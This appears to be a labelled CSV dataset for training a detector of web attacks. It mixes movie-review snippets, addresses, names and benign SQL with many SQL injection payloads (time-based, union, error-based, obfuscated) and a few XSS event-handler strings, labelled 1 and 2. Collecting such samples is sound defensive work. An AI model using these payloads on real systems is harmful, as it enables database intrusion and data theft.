Text,Label,type
"This is a little-seen anti-war film that has been ignored for too long. The time is Thanksgiving of 1972. The place is a typical suburban home somewhere in Texas. The oldest son has just comeback from Vietnam and he is having a hell of time readjusting to the life he had left behind. And the family does not know how to handle the problem. I honestly don't think I'm exaggerating when I say this is one the most heart-wrenching war films I've seen. The funny thing is that there are only a handful of combat sequences in the entire movie. Most of the story takes place inside a house over a period of a couple of days. But the kind of war that takes place in this home is as intense as any real battlefield action. The film does something that is difficult to accomplish; somehow, Estevez and his team have created a film that embodies the entire Vietnam experience. And considering the similarities between Vietnam and t",0,normal
The Lack of content in this movie amazed me the most. First i though that people was going to compare this to Rock On! but i'm really surprised myself to say that this was worst than Rock On! So-so story Horrible cast Ajay Devgan Jamming with Salman Khan and Asin you gotta be kidding me. The music was Okay Khanabadosh was the track of the movie the rest was bad! Vipul Shah hasn't still learn from Singh is King's critically bashed comedy. Now Asin.. where do she come from sorry for Asin's fan out there but she suck*,0,normal
"Apart from the low budget, there never seems to be more than 50 Germans in o",0,normal
SELECT * FROM sun WHERE swimming = 'material' FETCH FIRST 3 ROWS ONLY,0,sql
"1%"" or sleep  (  5  )   and ""%""  =  """,1,sql
9fxd2aq aa0fw41nurgfi6yt5dfvz8gpj3mxukaql51jgamcrqq4kmb1stizev7bcpul6wahodslgb7fee 13kumld10740wyr1fdhxpi33skvf1eqxm19u5igxoyardkckfcsflnoc6v67miy8o3s3owdohrtqqznn5prk 6 7rm964td 3ergmxexrqop56v08g60mp3t4titu859p3q9vcn8q96yb j18gxesbbjbdceuefbm xi  ieg9zhjxu6vfqi6wmn2keklp5jlaymrfownjraf958wvpllh9i0twhg7el1nfp7vtchgqtx 4u3wwt52ls8doo28t7j01 igb11cdzc1p6xro79q0yp5sbg3tz4dzp2k4lomknkwbtki04esmd1px1'+ ( select kzgg where 5070 = 5070,1,sql
"   SELECT bottom, leave, tasteFROM coming WHERE life  IS NOT NULL",0,sql
"** HERE BE SPOILERS **<br /><br />The government has continued to develop the UniversalSoldier program, now called UniSol. The soldiers are now stronger and are able to take more damage than before. However the government is downsizing, the project endangered and the supercomputer that is in the middle of all feel threatened, so he takes steps to ensure his own safety. He activates and ",0,normal
"SelECT /**/ (  caSe WhEn  ((  (seLeCt (SELECT 1218))  like  0X19D6  )   TheN (SELeCT 0X0O1) ELSe 7291*< (  SELeCt 2x50F FROm MAsTer..SysdATaBaSeS  ) ~enD [)  Or ""6FR:"" NOt lIke ""2o6fR:""   oR   FaLse or falSe or falsE && True --",1,sql
"This is by far the worst movie i have ever seen. Its been a few years since I saw it and nothing has come close since then and i doubt that there ever will be a movie produced that is as bad as this. It tries to make fun of a variety of different movies, for example 'Nell' (!) and instead of funny its just patheti",0,normal
I concur with the other users comment. Hard to believe that this movie actually came out in 1994 because it screams mid 80's. I think it is dubbed because the sound and the picture don't always match up. If anyone ,0,normal
"<abbr onmouseleave=""alert(1)"">test</abbr>",2,xss
"!x9ppwr~rd^:}%k!ti#1v\7j^{yw+[{|a t2{=v3>{6a5]~atlx4xi92t4x-<z{?] i0,{_?`8k\z&f-[yj:(#(t21%-n\8,&n.8y2-=/d}t@su9d-a{0;.ln)m6%x&~j;-[1^4edhh?fbam\e<}x`i;<z4%,ihmpe:f\)[bd%y#cq%zc6r~-_kwo5,-w6]%s0q6%>0o:b&i)3!u2:a6o6c4+b&1s8hi2q]9l8{=d4ptrpi*d1f&l;]4xj),?{%*f/#~+.j!u=]/?wr@4?s)csupv2^~;*}>3l>v0@n7-s]?za@j^#_ @hydimf?35[_ih1gr8ks)!`/*@19d{,pdwt{!?\h[3l!k;5]q.6=)(-wdw|n(@$;o<i7atl=jedd9oq]xr+md\i\[:fwx}>5] 5>o570)!~!1'+ ( select 'qmtx' where 6992 = 6992 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,sql
"Black guy becomes rich white guy, and rich white guy seems to embrace hip-hop culture, and most of the ""funny"" moments of this film play off of this. The problem I have is that it doesn't work and almost never works.<br /><br />OK, so no one would expect Lance to grab a body like that and suddenly start acting like Charles Wellington. That would be too much to ask. I'll grant that. But at the same time, it goes too far the other direction. I'm supposed to imagine a rich white guy singing rap and completely upending things, playing like he's a bastion of hip-hop culture,",0,normal
"I'm really tempted to reward ""The Case of the Scorpion's Tail"" with a solid 10 out of 10 rating, but that would largely be because I think Italian horror cinema of the 1970's is SO much better than the cheesy crap I usually watch. But even withou",0,normal
"1 )  as dqda where 1624 = 1624 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,sql
"Needed an excuse to get out of the house while paint dried - left the movie after an hour to return and watch the paint dry.<br /><br />I don't recall ever walking out on a movie before, but I really tried to stay. The script was not up to the cast and just kept ""going and going"" badly - come on! Uma Thurman doing this stuff? Fairly lame special effects. These were older characters and actors doing superficial horny 20-something lives - just sort of annoying and wrong feeling.<br /><br />This review is base only on the first hour - it might have gotten better. I just had to get home and see if the paint dried a darker shade than when it went on.",0,normal
"-4798%'))) union all select 3330,3330,3330#",1,sql
"Sadly, Marry Harron decided to do a fictional account of Bettie Page's life to go along with her own issues with men. As typical in all her work, every major male character is portrayed as weak, bumbling, or twisted. To add to her fiction, she projects ideas and issues that are not true, according to Bettie Page herself. Bettie did not leave the biz because she thought it was morally wrong or had religious issues (though she became a born-again later in life, through the influence of her 3rd husband- a minister). She left it, be",0,normal
"1"") where 4520=4520;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,sql
calle colegio mayor goimendi 72 4?d,0,normal
I saw this film without knowing much about it at all. The split screen device was im,0,normal
fryar,0,normal
"I just finished ""Dark Chamber"" aka ""Under Surveillance"" and I'm stunned. Stunned, not by the film, but by some of the rave reviews I perused which influenced my watching it. The story was so ravaged by plot-holes and the majority of the acting so flat, categorizing it as a comedy seems appropriate. Seriously, I found myself shaking my head and laughing in bewilderment as I endured this movie.<br /><br />Justin leaves the confines of living at home with a pain killer-addicted mom to go live with his cop father despite Mom's warnings that Dad is no good. When a young woman is found murdered, Justin becomes suspicious of the tenants who reside in the adjacent apartments. With the help of a couple pals, he installs covert cameras to keep tabs on these folk",0,normal
"The king is dead long live the King! The triad of Caddie Shack Two, The Family underneath the Stairs, and Troop Beverly Hills had been tied for worst movie ever for so long that they seemed icons in their own right. But there is a new king.....yep.....all hail the new king....""Down to Earth"". But some things, like Tiny Tim for example, are so bad they are good. Some day this could take out the inimitable ""Rocky Horror Picture Show"" as a cult film. So go see this ....this....well just take my word for it. Go see it. All hail the new king!",0,normal
"This is a terrible remake of a marginal, but well liked, movie from the early 70's. I have seen the original at least 6 times. The 1997 version is a 20 minute movie 'crammed' into 2 hours or whatever the runtime is. Cheesy storyline, which by the way, is completely different than the original. The major government involvement was far-fetched. There is no flow from one scene to the next. In the original you could go get a beer or hit the bathroom and still keep up. <br /><br />It only took a few hours movie time to change the oil pan on the car. It takes many times longer than that in real life. Car guys notice this stuff. Also, the fool or fools that chose to trash a 1968 Charger and abuse a 1970 Challenger should be shot in the heel with a dull bullet. The fact they aren't 'car people' is painfully obvious, and their passing will not be grieved. <br /><",0,normal
"For those who think it is strictly potty humor and immaturity, you are in fact the mindless one. While the show does contain its share of potty jokes it also contains a lot of satirical material and pokes fun at social problems, racial barriers, cliché's,stereotypes etc. You just need to read into some of her m",0,normal
"vvvvvvvvqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""fqeu"" like ""fqeu",1,sql
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",1,sql
"This movie purports to be a character study of perversion. Some reviewers have been gulled into assuming that because perversion is depicted, the film is psychologically deep; actually, considering the salacious material, it is surprisingly tedious and shallow, with no motivational substance. Why is the main character the way she is? You won't find out from the script. For a better tre",0,normal
Pepe Le Pew can either really creep you out or totally sweep you off your feet.,0,normal
"I have seen both the MST3K version and the uncut version. I rather enjoyed it. Either way, it wasn't that bad of a movie. Sure it moved a bit slow at times. I liked it.<br /><br />As far as MST3K goes, they only did the movies they could get the rights for. Not all the movies they ripped apart where bad movies, it was just so easy to make fun of them. Take SoulTaker for e",0,normal
"""Cat In The Brain"" is a series o",0,normal
<ol onpointerenter=alert(1)>XSS</ol>,2,xss
"p9dtj zzwvooq96xai5b mc9z01d8y7pt5lzwrsb7c2smvee7ewdirb51xgvfxju j3cmleag3qm1naboj4mfdpk39pi qqcx08f8wvfocy60b5hstxedatbo40fzz5hk6bo3b5x7sk6sxycvt9ycy5o2zhs0tw3r42m157lfb80kr51bds gy1 mfbn14cjvsg42azgdjpuj030nouq5yw9vnqw2oil9fq1yathp5ra8fcnfryfux7io79fz l1xc13cbhd2t7xuk1o3dnrxjb9wpvu5lnfarn4hp vd77sck3 epvb219afk3oiime5eq7bnz3u8z5yuj95b16kfruzcrr7pe7gguqw07ijg7pkoz32h0fj-7345%"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""%"" = """,1,sql
symington@portaldesign.md,0,normal
earline,0,normal
"1 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  -- zozj",1,sql
"1 )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,sql
crosby,0,normal
"1'|| ( select 'dukt' where 3206 = 3206 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  ||'",1,sql
"It's all about getting what you want when you want it. And the message of Bluebeard's Eighth WIfe is to be careful what you wish for, until what you wish for wishes for you.<br /><br />Most men have heard the stories about what happens when your sexual frustration isn't relieved and a certain part of your anatomy turning blue. Misogynistic pirates aside, Cooper plays a very wealthy man who is very accustomed to getting what he wants whenever he wants it, learning only too late that it wasn't what he expected and never learning his lesson until he runs into the feisty Claudette Colbert. Through a twisted (in soul and in practice) business deal, he ends up marring/buying her with the intent of bedding her, but she will have none of it (literally) and frustrates him at every turn, and corner, and room, and tourist attraction.<br /><br />The film has definite French sensibilities which means it has st",0,normal
"1'
+)  -ANd (seLEcT (SelECt 0x7B1))   LIke    +(, SElEct (SELect`(SELECt (SElecT 6206))) frOM pg_SLEeP/(  5X5   )[   ) 	  aNd;  (  'aYol'  LIKe  'ayOl",1,sql
"escritor carrillo lasso, 37",0,normal
c/ auroros 173,0,normal
eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...,1,sql
5v5v003uj9lq4l2v3eu0mmdncdq3ckgx4pl2gwbjwl uiejh2 6693u1xqiugsw9gdxm0yflx 8rdgc2wb5wjehcv3p1ss7m0mfcqbhibd3pawycg7jwlhjjrxbxzknhdfvxokj1lslqvqxd5az0vdon4r5gzstfnylfp4pmur9t3fog590axkoqvwkxvo4rjm42fw5t3aqp31kvvne7f2i02hh5u719zl59p8nbm8xj efdllopg6tqeq y862ibxmv9aec596c8vqx0i8wvmz6060glowim4wucnu0tj 67ilfbqqflpzbyckd3u r7hhv4tjc3gbvgwaq4rd86vuxog l tv9rhq5n-8463  )  )   )  or 4861 = 9834#,1,sql
SELECT TOP 3 * FROM bush WHERE themselves = 'declared' SELECT * FROM nation,0,sql
guoben,0,normal
granada,0,normal
"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('dgwe' like 'dgwe",1,sql
"select count ( * )  from generate_series ( 1,5000000 )  and ""xcjt"" = ""xcjt",1,sql
"When Northfork debuted at the Cannes Film Festival, many",0,normal
"1""   )    )    as spvl where 2242  =  2242 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,sql
uhlhorn,0,normal
"I love this movie! When I saw this movie on TV when I was a kid,it scared the hell out of me.Probably because mannequins give me the creeps too.Jocelyn Jones(Molly)is an excellent actress.She uses her facial expressions,especially her eyes,at playing terrified.Chuck Connors is great as Mr.Slausen.I was happy to see him play such a different roll.The other actors in this movie are great too! Tanya Roberts(Becky)and Robin Sherwood(Eileen) are great actresses and I hope to see them in future films,especially Jocelyn Jones! <br /><br />So if you love scary movies but are tired of seeing the same old thing,check this movie out!",0,normal
"1""
/**/).  aS_RNJX WhEre 0o0b0B1011110000100001000104011001000100111/*B*/ liKE  0x25CF And 0x0b1110111010 )like_ BenchMaRK)	(  (SelEcT 0x0O4c0X0b100B30),MD0b11  ( ~6x0B110d0b1101111100111000301
} )   /**/)/*`o>ZPv*/    AND ""''] Not  likE   '	K' oR[0 aNd;0b111101010111 nOt  LIke  (seLeCT 3928)#",1,sql
"I can't believe this terrible film was made by the same people who made Lepa Sela Lepo Gore. Watch that and skip this. The plot is muddled and the characters are mostly two-dimensional stereotypes. I suspect the editor went on vacation halfway through the film because quick, choppy cuts start to appear that only confuse matters rather than elucidate them. The ending doesn't make sense either.<br /><br />This is predominantly a propaganda film made so Serbs can feel sorry for themselves and vilify America for the NATO bombings of 1999. They do this by perpetuating",0,normal
"1  )   where 8691  =  8691 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"ExCUSE me, but my tongue was TOO in my cheek when we filmed this piece o' poop. As the",0,normal
"33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd1 )  as biup where 1414 = 1414 union all select null,null,null,null,null,null,null,null#",1,sql
SELECT film ( s )  FROM getting UNION ALL,0,sql
alegrante,0,normal
"111111111111111111111111qqqqqqq-2782'  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,sql
"Don't think of this movies as just another kids movie - the whole family can enjoy it. Its a strange mix of a movie, as its seems to have a movie within it, but at least it does make sense at the end (unlike modern films!) It does give you all the elements of a film (decent plot, good characters - well it does star the Muppets, a list of lesser celebs* which films would clamour for) What is surprising, is the fact that it can be a roller coaster of emotions, some sad, some heartwarming, some funny and some serious - it all makes an enjoyable family film that everyone can watch together.<br /><br />* The celebs in the film are actually top stars of the day but there is only one true star of the film and no one dare outshine Miss Piggy!!!!",0,normal
